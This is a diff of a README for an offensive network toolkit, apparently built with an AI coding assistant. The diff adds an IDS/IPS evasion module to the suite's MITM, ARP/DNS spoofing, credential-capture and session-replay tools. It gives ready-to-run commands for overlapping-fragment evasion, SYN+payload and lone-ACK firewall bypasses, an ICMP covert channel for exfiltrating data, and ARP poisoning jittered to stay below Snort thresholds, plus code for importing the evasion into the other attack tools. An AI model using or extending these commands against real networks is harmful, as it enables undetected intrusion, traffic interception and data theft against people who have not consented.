@@ -1,6 +1,8 @@
-# ClaudeCodeIPTool v5.0
+# ClaudeCodeIPTool v6.0
 
-Complete IP spoofing, MITM, session replay, and proxy routing suite for VDT (Vulnerability Discovery Testing). **15 functional tools** covering reconnaissance, Layer 2/3/DHCP/IPv6/ICS MITM, WebSocket hijacking, service discovery poisoning, Chrome TLS impersonation, SOCKS5 routing, credential capture, and defense detection.
+Complete IP spoofing, MITM, session replay, proxy routing, and detection evasion suite for VDT (Vulnerability Discovery Testing). **16 functional tools** covering reconnaissance, Layer 2/3/DHCP/IPv6/ICS MITM, WebSocket hijacking, service discovery poisoning, Chrome TLS impersonation, SOCKS5 routing, credential capture, defense detection, and IDS/IPS evasion.
+
+**New in v6.0:** Detection evasion module — Ptacek-Newsham insertion/evasion, overlapping IP fragments, TTL ghost packets, TCP SYN+payload bypass, lone ACK, bad-checksum decoy, ICMP covert channel (Loki-style), DNS case variation + compression pointers, ARP jitter, rate-limiting profiles. Importable by all other tools via `EvasionConfig`.
 
 **New in v5.0:** IPv6 NDP/RA spoofing, mDNS/WS-Discovery/SSDP poisoning, ICS/OT protocol probe (Modbus/DNP3/EtherNet-IP/BACnet/OPC-UA), WebSocket CSWSH + frame injection.
 
@@ -272,9 +274,60 @@ python3 ics-probe.py bacnet 192.168.1.100 spoof-cov --device 1234 --type 0 --ins
 
 ---
 
+#### 13. `evasion.py` - IDS/IPS Detection Evasion Module
+Ptacek-Newsham (1998) insertion/evasion primitives — importable by other tools or run standalone:
+
+- **Fragment overlap** (Ptacek-Newsham): overlapping IP fragments; IDS sees benign decoy, target reassembles real payload
+- **TTL ghost insertion**: interleave ghost packets (TTL expires before target) to split IDS signatures across dead bytes
+- **Tiny fragment flood**: 8-byte fragments exhaust IDS reassembly buffer/timeout
+- **TCP SYN+payload**: 4B data in SYN bypasses post-handshake IDS signature engines
+- **Lone ACK**: ACK with no prior SYN bypasses stateless firewall `--state ESTABLISHED` rules
+- **Bad checksum decoy**: invalid TCP checksum drops at target but IDS without validation processes it
+- **ICMP covert channel**: Loki-style type-0 echo reply carrier; XOR-encode data in OS-mimicking payloads
+- **DNS evasion**: case variation, RFC 1035 compression pointers, random subdomain prefixes, DNS covert channel
+- **ARP jitter**: randomized 15-45s ARP poison interval stays below Snort arp-spoof threshold (5/10s)
+- **Rate profiles**: `paranoid` (5/hr), `silent` (5/min), `slow` (30/min), `normal` (2/sec), `aggressive` (10/sec)
+
+```bash
+# List all rate profiles and IDS thresholds
+python3 evasion.py profiles
+
+# Overlapping fragment evasion (Ptacek-Newsham)
+sudo python3 evasion.py frag-overlap --src 10.0.0.1 --dst 10.0.0.2 --payload "GET / HTTP/1.1"
+
+# SYN+payload: bypass post-handshake IDS signature engines
+sudo python3 evasion.py syn-payload --dst 10.0.0.2 --dport 80 --payload "ATTACK"
+
+# Lone ACK: stateless firewall bypass
+sudo python3 evasion.py lone-ack --dst 10.0.0.2 --dport 443
+
+# ICMP covert channel (Loki-style)
+sudo python3 evasion.py icmp-covert --src 10.0.0.1 --dst 10.0.0.2 --data "exfil payload"
+
+# Jittered ARP poison (evades Snort arp-spoof preprocessor threshold)
+sudo python3 evasion.py arp-jitter --target 192.168.1.100 --spoof 192.168.1.1 \
+     --our-mac de:ad:be:ef:00:01 --target-mac aa:bb:cc:dd:ee:ff
+
+# Rate test: measure actual pps at chosen profile
+sudo python3 evasion.py rate-test --dst 10.0.0.2 --count 20 --profile silent
+```
+
+**Module import** (retrofit other tools):
+```python
+from evasion import EvasionConfig
+ev = EvasionConfig(profile="slow", ip_id_random=True, ttl_ghost=False)
+ev.send(IP(dst=target)/TCP(dport=80))  # rate-limited + ID-randomized
+```
+
+**Status**: ✓ Functional (requires Scapy for all packet modes)
+
+**Ptacek-Newsham model (1998)**: IDS and target reconstruct byte streams differently. *Insertion*: packets the IDS accepts but target ignores (bad TTL, bad checksum). *Evasion*: packets the target accepts but IDS drops (overlapping fragments, tiny frags). Both techniques split signatures across the anomalous bytes.
+
+---
+
 ### Defensive
 
-#### 13. `defense-detector.py` - Spoofing Attack Detection
+#### 14. `defense-detector.py` - Spoofing Attack Detection
 Detect ARP/DNS attacks on your own network:
 - ARP spoof detection (MAC change monitoring per IP)
 - DNS spoof detection (response IP inconsistency tracking)
@@ -291,7 +344,7 @@ sudo python3 defense-detector.py dns -v
 
 ### Session Routing
 
-#### 14. `session_replay.py` - Cookie Session Replay with Chrome TLS Impersonation
+#### 15. `session_replay.py` - Cookie Session Replay with Chrome TLS Impersonation
 Replay captured browser sessions with proper TLS fingerprinting:
 - `curl_cffi` mimics Chrome's exact JA3/JA3s/ALPN fingerprint
 - Reads Netscape-format cookie files
@@ -307,7 +360,7 @@ python3 session_replay.py test-tls --url https://tls.browserleaks.com/tls
 
 **Status**: ✓ Functional (requires `pip install curl_cffi`)
 
-#### 15. `windscribe_socks.py` - SOCKS5 Proxy + Chrome TLS Chain
+#### 16. `windscribe_socks.py` - SOCKS5 Proxy + Chrome TLS Chain
 Channel sessions through VPN exit IPs:
 - Routes `curl_cffi` sessions through Windscribe SOCKS5 (localhost:1080)
 - Shows exit IP and ASN before/after for routing confirmation
@@ -395,6 +448,7 @@ sudo python3 dns-spoof.py --domain "*" --ip 192.168.1.50
 | mdns-poison.py | Service discovery | LAN | mDNS/WSD/SSDP | Yes |
 | ndp-spoof.py | L2+L3 IPv6 MITM | LAN | IPv6/NDP | Yes |
 | ics-probe.py | ICS/OT control | LAN/OT | Modbus/DNP3/CIP | Yes |
+| evasion.py | IDS/IPS evasion | Any | IP/TCP/ICMP/DNS | No |
 
 ---
 
